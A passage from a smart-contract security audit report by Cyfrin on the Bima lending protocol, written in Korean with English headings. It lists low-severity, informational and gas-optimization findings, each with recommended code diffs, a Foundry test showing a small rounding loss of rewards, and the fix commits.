실행: `forge test --match-test test_redeemCollateral_noCollateralForRemainingAmount`

**Recommended Mitigation:** `TroveManager::_redeemCollateralFromTrove`는 이러한 0으로 내림 현상이 발생할 때 `singleRedemption.cancelledPartial = true;`와 함께 반환해야 합니다:
```diff
                if (
                    icrError > 5e14 ||
+                   singleRedemption.collateralLot == 0 ||
                    _getNetDebt(newDebt) < IBorrowerOperations(borrowerOperationsAddress).minNetDebt()
                ) {
                    singleRedemption.cancelledPartial = true;
                    return singleRedemption;
                }
```

**Bima:**
커밋 [a6a05fe](https://github.com/Bima-Labs/bima-v1-core/commit/a6a05fe3497cf78fe575b3093ba620d23ad60969)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### `StabilityPool` should use per-collateral rounding error compensation

**Description:** Prisma는 커밋 [0915dd4](https://github.com/prisma-fi/prisma-contracts/commit/0915dd4983ddbafd03601b186f2e1b8eae7dc311#diff-1cba6dc54756d6e48926d14e0933ff37d349c271ae78f2b5f02e85aa8fc9c312R417)에서 "_이 커밋 이전에는, 빚진 담보가 먼지(dust) 양만큼 편차를 보일 수 있었습니다. 어떤 경우에는 마지막으로 담보를 청구한 사용자의 호출이 revert 될 수 있었습니다._"라고 언급하며 이 문제를 수정했습니다.

**Recommended Mitigation:** Prisma의 패치에 따라 수정 사항을 구현하세요.

**Bima:**
커밋 [d437ff5](https://github.com/Bima-Labs/bima-v1-core/commit/d437ff5b0ab0df8ecd0ca6c891d16d1e45850858)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### `StabilityPool` reward calculation loses small amounts of vault emission rewards

**Description:** `StabilityPool`은 사용자가 투표할 경우 `BabelVault`로부터 토큰 배출 보상을 받을 수 있으며, 이 보상은 `StabilityPool`에 예금한 사용자에게 분배됩니다. 예금자의 보상 지분을 계산하는 메커니즘은 소액의 토큰 배출물 손실을 초래하는 것으로 보입니다.

**Impact:** `StabilityPool`에 할당된 주간 토큰 배출량의 전부가 예금자에게 분배되는 것은 아닙니다. 소액은 전혀 분배되지 않고 사실상 손실됩니다.

**Proof of Concept:** PoC를 `test/foundry/core/StabilityPoolTest.t.sol`에 추가하세요:
```solidity
function test_claimReward_smallAmountOfStabilityPoolRewardsLost() external {
    // setup vault giving user1 half supply to lock for voting power
    uint256 initialUnallocated = _vaultSetupAndLockTokens(INIT_BAB_TKN_TOTAL_SUPPLY/2);

    // user votes for stability pool to get emissions
    IIncentiveVoting.Vote[] memory votes = new IIncentiveVoting.Vote[](1);
    votes[0].id = stabilityPool.SP_EMISSION_ID();
    votes[0].points = incentiveVoting.MAX_POINTS();

    vm.prank(users.user1);
    incentiveVoting.registerAccountWeightAndVote(users.user1, 52, votes);

    // user1 and user 2 both deposit 10K into the stability pool
    uint96 spDepositAmount = 10_000e18;
    _provideToSP(users.user1, spDepositAmount, 1);
    _provideToSP(users.user2, spDepositAmount, 1);

    // warp time by 1 week
    vm.warp(block.timestamp + 1 weeks);

    // calculate expected first week emissions
    uint256 firstWeekEmissions = initialUnallocated*INIT_ES_WEEKLY_PCT/BIMA_100_PCT;
    assertTrue(firstWeekEmissions > 0);
    assertEq(babelVault.unallocatedTotal(), initialUnallocated);

    uint16 systemWeek = SafeCast.toUint16(babelVault.getWeek());

    // no rewards in the same week as emissions
    vm.prank(users.user1);
    uint256 userReward = stabilityPool.claimReward(users.user1);
    assertEq(userReward, 0);

    // verify emissions correctly set in BabelVault for first week
    assertEq(babelVault.weeklyEmissions(systemWeek), firstWeekEmissions);

    // warp time by 1 week
    vm.warp(block.timestamp + 1 weeks);

    // rewards for the first week can be claimed now
    vm.prank(users.user1);
    userReward = stabilityPool.claimReward(users.user1);

    // verify user1 receives half of the emissions
    assertEq(firstWeekEmissions/2, 268435455937500000000000000);
    assertEq(userReward,           268435455937499999999890000);

    // user 2 claims their reward
    vm.prank(users.user2);
    userReward = stabilityPool.claimReward(users.user2);
    assertEq(userReward,           268435455937499999999890000);

    // firstWeekEmissions = 536870911875000000000000000
    // userReward * 2     = 536870911874999999999780000
    //
    // a small amount of rewards was not distributed and is effectively lost
}
```

실행: `forge test --match-contract StabilityPoolTest --match-test test_claimReward_smallAmountOfStabilityPoolRewardsLost -vvv`

**Recommended Mitigation:** 이 문제는 누락된 테스트 모음 커버리지를 채울 때 감사 종료 시점에 발견되었으므로, 원인은 아직 확인되지 않았으며 프로토콜 팀이 테스트 모음을 사용하여 조사해야 할 부분으로 남아 있습니다.

**Bima:**
인정함(Acknowledged).

\clearpage
## Informational


###  Avoid floating pragma unless creating libraries

**Description:** [SWC-103](https://swcregistry.io/docs/SWC-103/)에 따르면 라이브러리를 생성하지 않는 한 pragma의 컴파일러 버전은 고정되어야 합니다. 개발, 테스트 및 배포에 사용할 특정 컴파일러 버전을 선택하세요. 예:
```diff
- pragma solidity ^0.8.19;
+ pragma solidity 0.8.19;
```

**Bima:**
커밋 [171dacf](https://github.com/Bima-Labs/bima-v1-core/commit/171dacf9a744478cdaeb9bca5366483883cf7bb3)에서 수정되었습니다.

**Cyfrin:** 해결되었습니다.


### Use named imports instead of importing the entire namespace

**Description:** 전체 네임스페이스를 가져오는 것보다 많은 [장점](https://ethereum.stackexchange.com/a/117173)을 제공하는 명명된 가져오기를 사용하세요.

**Bima:**
커밋 [171dacf](https://github.com/Bima-Labs/bima-v1-core/commit/171dacf9a744478cdaeb9bca5366483883cf7bb3) 및 [854a54e](https://github.com/Bima-Labs/bima-v1-core/commit/854a54e833dd536f8112ae0d10f4fa322d81830f)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Use explicit `uint256` instead of generic `uint`

**Description:** 일반적인 `uint` 대신 명시적인 `uint256`을 사용하세요:
```solidity
core/LiquidationManager.sol
163:        uint debtInStabPool = stabilityPoolCached.getTotalDebtTokenDeposits();
167:            uint ICR = troveManager.getCurrentICR(account, troveManagerValues.price);
192:            (uint entireSystemColl, uint entireSystemDebt) = borrowerOperations.getGlobalSystemBalances();
198:                uint ICR = troveManager.getCurrentICR(nextAccount, troveManagerValues.price);
279:        uint debtInStabPool = stabilityPoolCached.getTotalDebtTokenDeposits();
283:        uint troveCount = troveManager.getTroveOwnersCount();
284:        uint length = _troveArray.length;
285:        uint troveIter;
291:            uint ICR = troveManager.getCurrentICR(account, troveManagerValues.price);
320:                uint ICR = troveManager.getCurrentICR(account, troveManagerValues.price);
402:        uint pendingDebtReward;
403:        uint pendingCollReward;
455:        uint entireTroveDebt;
456:        uint entireTroveColl;
457:        uint pendingDebtReward;
458:        uint pendingCollReward;
508:        uint pendingDebtReward;
509:        uint pendingCollReward;

interfaces/IGaugeController.sol
5:    function vote_for_gauge_weights(address gauge, uint weight) external;

interfaces/ILiquidityGauge.sol
7:    function withdraw(uint value) external;

interfaces/IBoostDelegate.sol
26:        uint amount,
27:        uint previousAmount,
28:        uint totalWeeklyEmissions
45:        uint amount,
46:        uint adjustedAmount,
47:        uint fee,
48:        uint previousAmount,
49:        uint totalWeeklyEmissions

dao/InterimAdmin.sol
90:        uint loopEnd = payload.length;

dao/IncentiveVoting.sol
377:            uint amount = frozenWeight / MAX_LOCK_WEEKS;
```

**Bima:**
커밋 [f614678](https://github.com/Bima-Labs/bima-v1-core/commit/f614678e78e5d3dd91682aeca7ae6e881d927052)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Emit events for important parameter changes

**Description:** 중요한 매개변수 변경에 대해 이벤트를 발생시키세요:
```solidity
Factory::setImplementations

BorrowerOperations::_setMinNetDebt
AirdropDistributor::setClaimCallback, sweepUnclaimedTokens
InterimAdmin::setAdminVoting
TokenLocker::setAllowPenaltyWithdrawAfter, setPenaltyWithdrawalsEnabled
DelegatedOps::setDelegateApproval
CurveProxy::setVoteManager, setDepositManager, setPerGaugeApproval
TroveManager::setPaused, setPriceFeed, startSunset, setParameters, collectInterests
```

**Bima:**
커밋 [97320f4](https://github.com/Bima-Labs/bima-v1-core/commit/97320f440af3522e34337336bbf5355cdc574393), [b8d648a](https://github.com/Bima-Labs/bima-v1-core/commit/b8d648a83ebf3747ff41d0aa20172e65adcb0d5a), [6be47c8](https://github.com/Bima-Labs/bima-v1-core/commit/6be47c806dea53901f0c39d42948aa80321486b2), [90adcd4](https://github.com/Bima-Labs/bima-v1-core/commit/90adcd49d826670d1117eb733b2a23d93a306c23), [79b1e07](https://github.com/Bima-Labs/bima-v1-core/commit/79b1e070a4502e68da729136ccee7284d2f1112d), [6cf3857](https://github.com/Bima-Labs/bima-v1-core/commit/6cf3857e2e4e12d009d65743395b831a12db31aa), [87d56fa](https://github.com/Bima-Labs/bima-v1-core/commit/87d56fa1c3bb2b90284b30e5f24e6fea3e0e9517)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Use named mapping parameters

**Description:** Solidity 0.8.18은 명명된 `mapping` 매개변수를 [도입](https://soliditylang.org/blog/2023/02/01/solidity-0.8.18-release-announcement/)했습니다. 더 명확한 매핑을 위해 이 기능을 사용하세요:
```solidity
PriceFeed.sol
StabilityPool.sol

dao/AdminVoting.sol
dao/AllocationVesting.sol
dao/BoostCalculator.sol
dao/IncentiveVoting.sol
dao/TokenLocker.sol
dao/Vault.sol
```

**Bima:**
커밋 [95c0148](https://github.com/Bima-Labs/bima-v1-core/commit/95c01487339a59ea58a5e47d15eabc929e77174e), [3e68844](https://github.com/Bima-Labs/bima-v1-core/commit/3e68844b35da96a97cdb1f2e6a7c405e5589b805), [97320f4](https://github.com/Bima-Labs/bima-v1-core/commit/97320f440af3522e34337336bbf5355cdc574393), [6fb75f8](https://github.com/Bima-Labs/bima-v1-core/commit/6fb75f8cfe6244335745ab0477b08555990b7ae5), [6a2bd6e](https://github.com/Bima-Labs/bima-v1-core/commit/6a2bd6ec392540d9d484900129fa8ae56796092c), [6d5c17b](https://github.com/Bima-Labs/bima-v1-core/commit/6d5c17ba114a2623879484933567aececa6c8639), [a74cffa](https://github.com/Bima-Labs/bima-v1-core/commit/a74cffa39b644f66f5bd19dbe45358311689b7dc), [305c007](https://github.com/Bima-Labs/bima-v1-core/commit/305c0076552dcb2477b9f9135528b46279446abe), [fde2016](https://github.com/Bima-Labs/bima-v1-core/commit/fde2016d74f1c1a432743179eb6a3c5366df8b35)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Incorrect comment regarding the configuration of `DebtToken::FLASH_LOAN_FEE` parameter

**Description:** `DebtToken::_flashFee`는 `10000`으로 나누므로, `FLASH_LOAN_FEE = 1`이면 다음과 같습니다:
```solidity
1/10000 = 0.0001
0.0001 * 100 = 0.01%
```

따라서 1 = 0.0001%라는 주석은 잘못되었습니다:

```diff
File: DebtToken.sol
- uint256 public constant FLASH_LOAN_FEE = 9; // 1 = 0.0001%
+ uint256 public constant FLASH_LOAN_FEE = 9; // 1 = 0.01%
```

**Bima:**
커밋 [4ae0be3](https://github.com/Bima-Labs/bima-v1-core/commit/4ae0be305e1c87b2c9df89b4676f352d87ded3cf#diff-d399aa6726575b4ec26ffd8ee686529c41769d6d5e5d1918a0ba94d3652c715eR20)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### `TokenLocker::withdrawWithPenalty` should revert if nothing is withdrawn

**Description:** `TokenLocker::withdrawWithPenalty`는 먼저 0 입력을 거부하여 아무것도 인출되지 않은 경우 revert 되어야 합니다:
```diff
function withdrawWithPenalty(uint256 amountToWithdraw) external notFrozen(msg.sender) returns (uint256) {
    // penalty withdrawals must be enabled by admin
    require(penaltyWithdrawalsEnabled, "Penalty withdrawals are disabled");

+   // revert on zero input
+   require(amountToWithdraw != 0, "Must withdraw a positive amount");
```

그런 다음 루프 후, 사용자가 최대 인출을 지정한 경우 유사한 검사를 수행합니다:
```diff
// if users tried to withdraw as much as possible, then subtract
// the "unfilled" net amount (not inc penalties) from the user input
// which gives the "filled" amount (not inc penalties)
if (amountToWithdraw == type(uint256).max) {
    amountToWithdraw -= remaining;

+   // revert if nothing was withdrawn, eg if user had no locked
+   // tokens but attempted withdraw with input type(uint256).max
+   require(amountToWithdraw != 0, "Must withdraw a positive amount");
}
```

**Bima:**
커밋 [b8d648a](https://github.com/Bima-Labs/bima-v1-core/commit/b8d648a83ebf3747ff41d0aa20172e65adcb0d5a#diff-03e38b085efbd92e1efa0bc1816dab9179000258edf449791469ca5833167b71R787-R788)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Enforce > 0 passing percent configuration in `AdminVoting::setPassingPct`

**Description:** `AdminVoting::setPassingPct`에서 > 0 통과 비율 구성을 강제하세요:
```diff
function setPassingPct(uint256 pct) external returns (bool) {
    // enforce this function can only be called by this contract
    require(msg.sender == address(this), "Only callable via proposal");

-   // restrict max value
-   require(pct <= MAX_PCT, "Invalid value");
+   // restrict min & max value
+   require(pct <= MAX_PCT && pct > 0, "Invalid value");
```

**Bima:**
커밋 [065fbb8](https://github.com/Bima-Labs/bima-v1-core/commit/065fbb8368e4800bc52b5d19fff098528bb291bc)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### `TokenLocker::freeze` always emits `LocksFrozen` event with 0 amount

**Description:** `TokenLocker::freeze`는 `locked`를 감소시키고 `locked == 0`일 때만 종료되는 `while` 루프를 가지고 있으며, 그 후 `LocksFrozen` 이벤트가 항상 `locked = 0`으로 방출됩니다:
```solidity
uint256 bitfield = accountData.updateWeeks[systemWeek / 256] >> (systemWeek % 256);
// @audit loop only exits when locked == 0
while (locked > 0) {
    systemWeek++;
    if (systemWeek % 256 == 0) {
        bitfield = accountData.updateWeeks[systemWeek / 256];
        accountData.updateWeeks[(systemWeek / 256) - 1] = 0;
    } else {
        bitfield = bitfield >> 1;
    }
    if (bitfield & uint256(1) == 1) {
        uint32 amount = unlocks[systemWeek];
        unlocks[systemWeek] = 0;
        totalWeeklyUnlocks[systemWeek] -= amount;
        // @audit locked decremented
        locked -= amount;
    }
}
accountData.updateWeeks[systemWeek / 256] = 0;
// @audit locked will always be 0 here
emit LocksFrozen(msg.sender, locked);
```

**Recommended Mitigation:** `while` 루프 전에 이벤트를 방출하세요.


**Bima:**
커밋 [c286563](https://github.com/Bima-Labs/bima-v1-core/commit/c286563b4a2e8972659928fd83aba8966603452f)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### `BorrowingFeePaid` event should include token that was repaid

**Description:** `BorrowingFeePaid` 이벤트는 상환된 담보 토큰을 포함해야 합니다:
```diff
- event BorrowingFeePaid(address indexed borrower, uint256 amount);
+ event BorrowingFeePaid(address indexed borrower, IERC20 collateralToken, uint256 amount);
```

그런 다음 이벤트를 방출할 때 상환되는 담보를 포함시켜, 어떤 담보 토큰이 상환에 사용되었는지 이벤트를 통해 쉽게 추적할 수 있도록 하세요.

**Bima:**
커밋 [d50d59e](https://github.com/Bima-Labs/bima-v1-core/commit/d50d59e29cc7ff13027d5967ebd29d7dcceaad59)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### `BabelVault::registerReceiver` should check `bool` return when calling `IEmissionReceiver::notifyRegisteredId`

**Description:** `BabelVault::registerReceiver`는 `IEmissionReceiver::notifyRegisteredId`를 호출할 때 `bool` 반환 값을 확인해야 합니다. 이 호출은 수신자(receiver) 컨트랙트가 배출을 받을 수 있는지 확인하는 건전성 검사(sanity check)로 의도되었기 때문입니다:
```diff
-   IEmissionReceiver(receiver).notifyRegisteredId(assignedIds);
+   require(IEmissionReceiver(receiver).notifyRegisteredId(assignedIds),
+          "notifyRegisteredId must return true");
```

**Bima:**
커밋 [d8b51bd](https://github.com/Bima-Labs/bima-v1-core/commit/d8b51bdb6ccffbe7dbdf995a98501e7cdd783df1)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Enforce 18 decimal collateral tokens in `Factory::deployNewInstance`

**Description:** 프로토콜은 담보 토큰의 소수점이 18이라고 가정합니다.

**Proof of Concept:** [BorrowerOperations::_getTCRData](https://github.com/Bima-Labs/bima-v1-core/blob/main/contracts/core/BorrowerOperations.sol#L583)에서 `TCR`을 계산할 때, 원시 담보 금액을 사용합니다.

```solidity
    function _getTCRData(
        SystemBalances memory balances
    ) internal pure returns (uint256 amount, uint256 totalPricedCollateral, uint256 totalDebt) {
        uint256 loopEnd = balances.collaterals.length;
        for (uint256 i; i < loopEnd; ) {
            totalPricedCollateral += (balances.collaterals[i] * balances.prices[i]);
            totalDebt += balances.debts[i];
            unchecked {
                ++i;
            }
        }
        amount = BabelMath._computeCR(totalPricedCollateral, totalDebt);

        return (amount, totalPricedCollateral, totalDebt);
    }

    function _computeCR(uint256 _coll, uint256 _debt) internal pure returns (uint256) {
        if (_debt > 0) {
            uint256 newCollRatio = (_coll) / _debt;

            return newCollRatio;
        }
        // Return the maximal value for uint256 if the Trove has a debt of 0. Represents "infinite" CR.
        else {
            // if (_debt == 0)
            return 2 ** 256 - 1;
        }
    }
```

`TCR = collaterals * prices / debt`를 계산하고 18 소수점을 가진 [CCR](https://github.com/Bima-Labs/bima-v1-core/blob/main/contracts/dependencies/BabelBase.sol#L14)과 비교합니다.

**Recommended Mitigation:** 프로토콜이 지원하려는 모든 담보 토큰이 18 소수점을 가지고 있으므로 이는 문제가 되지 않습니다. 그러나 `Factory::deployNewInstance`에서 새로운 담보를 활성화할 때 18 소수점 토큰만 허용하도록 해야 합니다.

**Bima:**
커밋 [ddcad19](https://github.com/Bima-Labs/bima-v1-core/commit/ddcad191ae4aba559d4705a6ff5772694c0fdbd5)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Consolidate `10000`, `MAX_FEE_PCT` and `MAX_PCT` used in many contracts into one shared constant

**Description:** 프로토콜 전반의 많은 컨트랙트에서 리터럴 `10000`을 사용하거나 이 숫자를 가진 `MAX_PCT` 또는 `MAX_FEE_PCT` 상수를 사용합니다; 이 모든 것을 `/dependencies/Constants.sol`의 새로운 파일에 하나의 공유 상수로 통합하세요:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

// represents 100% in BIMA used in denominator when
// calculating amounts based on a percentage
uint256 constant BIMA_100_PCT = 10_000;
```

**Bima:**
커밋 [9259e38](https://github.com/Bima-Labs/bima-v1-core/commit/9259e38587fc8a0f5991061b2aaa95201d9b3373)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Consolidate `DECIMAL_PRECISION` used in three contracts into one shared constant

**Description:** 세 개의 컨트랙트에서 사용되는 `DECIMAL_PRECISION`을 하나의 공유 상수로 통합하세요:
```solidity
core/StabilityPool.sol
21:    uint256 public constant DECIMAL_PRECISION = 1e18;

dependencies/BabelBase.sol
11:    uint256 public constant DECIMAL_PRECISION = 1e18;

dependencies/BabelMath.sol
5:    uint256 internal constant DECIMAL_PRECISION = 1e18;
```

**Bima:**
[6812dde](https://github.com/Bima-Labs/bima-v1-core/commit/6812dde8745a3d39d614181f6bfa63547216396a)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Consolidate `SCALE_FACTOR` used in two contracts into one shared constant

**Description:** 두 개의 컨트랙트에서 사용되는 `SCALE_FACTOR`를 하나의 공유 상수로 통합하세요:
```solidity
contracts/core/StabilityPool.sol
30:    uint256 public constant SCALE_FACTOR = 1e9;

contracts/dao/BoostCalculator.sol
59:    uint256 internal constant SCALE_FACTOR = 1e9;
```

**Bima:**
커밋 [1916b7a](https://github.com/Bima-Labs/bima-v1-core/commit/1916b7a63d0445dad22f6299329cdee7578a726b)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Consolidate `REWARD_DURATION` used in four contracts into one shared constant

**Description:** 네 개의 컨트랙트에서 사용되는 `REWARD_DURATION`을 하나의 공유 상수로 통합하세요:
```solidity
core/StabilityPool.sol
26:    uint256 constant REWARD_DURATION = 1 weeks;
399:                rewardRate = SafeCast.toUint128(amount / REWARD_DURATION);
400:                periodFinish = uint32(block.timestamp + REWARD_DURATION);

core/TroveManager.sol
53:    uint256 constant REWARD_DURATION = 1 weeks;
907:        rewardRate = uint128(amount / REWARD_DURATION);
909:        periodFinish = uint32(block.timestamp + REWARD_DURATION);

staking/Curve/CurveDepositToken.sol
48:    uint256 constant REWARD_DURATION = 1 weeks;
249:        rewardRate[0] = SafeCast.toUint128(babelAmount / REWARD_DURATION);
250:        rewardRate[1] = SafeCast.toUint128(crvAmount / REWARD_DURATION);
253:        periodFinish = uint32(block.timestamp + REWARD_DURATION);

staking/Convex/ConvexDepositToken.sol
81:    uint256 constant REWARD_DURATION = 1 weeks;
313:        rewardRate[0] = SafeCast.toUint128(babelAmount / REWARD_DURATION);
314:        rewardRate[1] = SafeCast.toUint128(crvAmount / REWARD_DURATION);
315:        rewardRate[2] = SafeCast.toUint128(cvxAmount / REWARD_DURATION);
318:        periodFinish = uint32(block.timestamp + REWARD_DURATION);

```

**Bima:**
커밋 [af23036](https://github.com/Bima-Labs/bima-v1-core/commit/af2303603e1a5ec53a414a15b54557c801b6153f)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Use `ITroveManager::Status` enum types instead of casting to `uint256`

**Description:** `uint256`으로 캐스팅하는 대신 `ITroveManager::Status` 열거형 타입을 사용하세요:
```diff
core/TroveManager.sol
- 364:    function getTroveStatus(address _borrower) external view returns (uint256 status) {
+ 364:    function getTroveStatus(address _borrower) external view returns (Status status) {

core/LiquidationManager.sol
- 130:        require(troveManager.getTroveStatus(borrower) == 1, "TroveManager: Trove does not exist or is closed");
+ 130:        require(troveManager.getTroveStatus(borrower) == ITroveManager.Status.active,
                "TroveManager: Trove does not exist or is closed");

core/helpers/TroveManagerGetters.sol
- 70:           if (ITroveManager(troveManager).getTroveStatus(account) > 0) {
+ 70:           if (ITroveManager(troveManager).getTroveStatus(account) != ITroveManager.Status.nonExistent) {

interfaces/ITroveManager.sol
- 228:    function getTroveStatus(address _borrower) external view returns (uint256);
+ 228:    function getTroveStatus(address _borrower) external view returns (Status);
```

**Bima:**
커밋 [1ab7ebf](https://github.com/Bima-Labs/bima-v1-core/commit/1ab7ebffbd1653e39230bf0b24f1996fbf89c117)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### `StorkOracleWrapper` assumes all price feeds return 18 decimal prices

**Description:** `StorkOracleWrapper`는 모든 가격 피드가 18 소수점 가격을 반환한다고 가정하고 8 소수점 값을 반환하기 위해 1e10으로 나누는 것을 하드코딩합니다.

Stork의 문서는 가격 피드가 반환하는 소수점 정밀도에 대한 공개적인 정보를 제공하지 않습니다. Bima는 `StorkOracleWrapper`와 함께 사용하는 모든 가격 피드가 실제로 기본 18 소수점 값을 반환하는지 주의 깊게 확인해야 합니다.

**Bima:**
인정함(Acknowledged) - 예, Stork Oracle의 모든 가격은 18 소수점입니다.

\clearpage
## Gas Optimization


### Don't initialize to default values

**Description:** 기본값으로 초기화하지 마세요:
```solidity
staking/Curve/CurveDepositToken.sol
152:        for (uint256 i = 0; i < 2; i++) {
203:        for (uint256 i = 0; i < 2; i++) {

core/StabilityPool.sol
155:        for (uint256 i = 0; i < length; i++) {
527:        for (uint256 i = 0; i < collateralGains.length; i++) {
554:        for (uint256 i = 0; i < collaterals; i++) {
729:            for (uint256 i = 0; i < length; i++) {
750:        for (uint256 i = 0; i < length; i++) {

staking/Curve/CurveProxy.sol
127:        for (uint256 i = 0; i < selectors.length; i++) {
222:        for (uint256 i = 0; i < votes.length; i++) {
286:        for (uint256 i = 0; i < balances.length; i++) {

core/TroveManager.sol
970:            for (uint256 i = 0; i < 7; i++) {

staking/Convex/ConvexDepositToken.sol
202:        for (uint256 i = 0; i < 3; i++) {
253:        for (uint256 i = 0; i < 3; i++) {

dao/InterimAdmin.sol
104:        for (uint256 i = 0; i < payload.length; i++) {
144:        for (uint256 i = 0; i < payloadLength; i++) {

core/helpers/TroveManagerGetters.sol
29:        for (uint i = 0; i < length; i++) {
43:        for (uint i = 0; i < collateralCount; i++) {
69:        for (uint i = 0; i < length; i++) {

dao/IncentiveVoting.sol
100:        for (uint256 i = 0; i < length; i++) {
444:            for (uint256 i = 0; i < length; i++) {
471:        for (uint256 i = 0; i < length; i++) {
522:        for (uint256 i = 0; i < votes.length; i++) {
544:        for (uint256 i = 0; i < lockLength; i++) {
557:        for (uint256 i = 0; i < length; i++) {
580:        for (uint256 i = 0; i < votes.length; i++) {
601:        for (uint256 i = 0; i < lockLength; i++) {
615:        for (uint256 i = 0; i < length; i++) {

dao/AdminVoting.sol
189:        for (uint256 i = 0; i < payload.length; i++) {
273:        for (uint256 i = 0; i < payloadLength; i++) {

dao/EmissionSchedule.sol
132:            for (uint256 i = 0; i < length; i++) {

dao/TokenLocker.sol
258:            for (uint256 i = 0; x != 0; i++) {
558:        for (uint256 i = 0; i < length; i++) {
623:        for (uint256 i = 0; i < length; i++) {

dao/Vault.sol
139:        for (uint256 i = 0; i < length; i++) {
147:        for (uint256 i = 0; i < length; i++) {
174:        for (uint256 i = 0; i < count; i++) {
359:        for (uint256 i = 0; i < length; i++) {

core/StabilityPool.sol
523:         hasGains = false;

core/helpers/MultiTroveGetter.sol
35:             descend = false;
```

**Bima:**
커밋 [3639347](https://github.com/Bima-Labs/bima-v1-core/commit/3639347f7d7808f1ca1e37d90b398bb1b68bfd34)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Remove redundant `token` parameter from `DebtToken::maxFlashLoan`, `flashFee`, `flashLoan`

**Description:** `DebtToken::maxFlashLoan`, `flashFee`, `flashLoan`에서 중복된 `token` 매개변수를 제거하세요 - `DebtToken`은 자체 토큰만을 사용하여 플래시 론을 제공하므로 이 매개변수는 쓸모가 없습니다.

**Bima:**
커밋 [bab12ba](https://github.com/Bima-Labs/bima-v1-core/commit/bab12ba5a9252d2a85b05f42100731176bd71c15)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


###  Cache storage variables when same values read multiple times

**Description:** 동일한 값이 여러 번 읽힐 때 스토리지 변수를 캐시하세요:

File: `dao/AirdropDistributor.sol`
```solidity
// function `setMerkleRoot`
// should cache `block.timestamp + CLAIM_DURATION` into memory,
// write that to `canClaimUntil` storage then read cached copy when
// emitting event
55:        canClaimUntil = block.timestamp + CLAIM_DURATION;
56:        emit MerkleRootSet(_merkleRoot, canClaimUntil);

// function `claim`
// cache `merkleRoot` saving 1 storage read
98:        require(merkleRoot != bytes32(0), "merkleRoot not set");
103:        require(MerkleProof.verifyCalldata(merkleProof, merkleRoot, node), "Invalid proof");
```

File: `dao/AllocationVesting.sol`
```solidity
// function `_vestedAt`
// cache `vestingStart` saving 2 storage reads
230:        if (vestingStart == 0 || numberOfWeeks == 0) return 0;
232:        uint256 vestingEnd = vestingStart + vestingWeeks;
234:        uint256 timeSinceStart = endTime - vestingStart;
```

File: `dao/Vault.sol`
```solidity
// function setInitialParameters
// cache unallocated calculation then use it to set unallocatedTotal
// and emit the event, saving 1 storage read
156:        unallocatedTotal = uint128(totalSupply - totalAllocated);
162:        emit UnallocatedSupplyReduced(totalAllocated, unallocatedTotal);
```

File: `core/StabilityPool.sol`
```solidity
// function startCollateralSunset
// cache indexByCollateral[collateral] to save 1 storage read
211:        require(indexByCollateral[collateral] > 0, "Collateral already sunsetting");
213:            uint128(indexByCollateral[collateral] - 1),
```

**Bima:**
커밋 [6be47c8](https://github.com/Bima-Labs/bima-v1-core/commit/6be47c806dea53901f0c39d42948aa80321486b2), [2166534](https://github.com/Bima-Labs/bima-v1-core/commit/2166534ed4d1071767e75322c4ad1c99ba8e9c27), [2ecc532](https://github.com/Bima-Labs/bima-v1-core/commit/2ecc5323b8fecab7f00ab185eb34afec9c654331)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Prefer assignment to named return variables and remove explicit return statements

**Description:** 명명된 반환 변수에 할당하고 명시적 반환 문을 제거하는 것을 [선호하세요](https://x.com/DevDacian/status/1796396988659093968).

**Bima:**
커밋 [82ef243](https://github.com/Bima-Labs/bima-v1-core/commit/82ef243b0dbe3e85bc53a7a9578faad8256f9a71), [2166534](https://github.com/Bima-Labs/bima-v1-core/commit/2166534ed4d1071767e75322c4ad1c99ba8e9c27), [3207c59](https://github.com/Bima-Labs/bima-v1-core/commit/3207c599871c2a55dd30acd45b8989d2ff4e1049), [ab8df52](https://github.com/Bima-Labs/bima-v1-core/commit/ab8df520fc2472e8654dd5a2cfb0c2c572ddcd0e), [1b12aa5](https://github.com/Bima-Labs/bima-v1-core/commit/1b12aa5b4a5e4f68f08da2dbe1994dfa8ed4a6af), [456df42](https://github.com/Bima-Labs/bima-v1-core/commit/456df420862d80f7b70b3513381320c281e02dd0), [1d469e1](https://github.com/Bima-Labs/bima-v1-core/commit/1d469e16b2d23cf7710fc1ee5edff9f4e7aa960d), [4d70707](https://github.com/Bima-Labs/bima-v1-core/commit/4d707077a247ce90c81bda072db42d2f145005fb), [f7e6487](https://github.com/Bima-Labs/bima-v1-core/commit/f7e64879bad30bbd13151aa6b85f7c72cd97674a), [a150695](https://github.com/Bima-Labs/bima-v1-core/commit/a15069514f86a219449d4a4e48a68da6e0ecd149), [91a7df5](https://github.com/Bima-Labs/bima-v1-core/commit/91a7df598b42a04e28c6ed42d8630fc74c2b7c1f), [80976c4](https://github.com/Bima-Labs/bima-v1-core/commit/80976c45c7317472d096ed10efd1029cc2daee7e), [709839c](https://github.com/Bima-Labs/bima-v1-core/commit/709839c74c93b66e56183c433ff89d2dfa0342bd)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Refactor `AdminVoting::minCreateProposalWeight` to eliminate unnecessary variables and multiple calls to `getWeek`

**Description:** 불필요한 변수와 `getWeek`에 대한 다중 호출을 제거하기 위해 `AdminVoting::minCreateProposalWeight`를 리팩토링하세요:
```solidity
function minCreateProposalWeight() public view returns (uint256 weight) {
    // store getWeek() directly into output `weight` return
    weight = getWeek();

    // if week == 0 nothing else to do since weight also 0
    if(weight != 0) {
        // otherwise over-write output with weight calculation subtracting
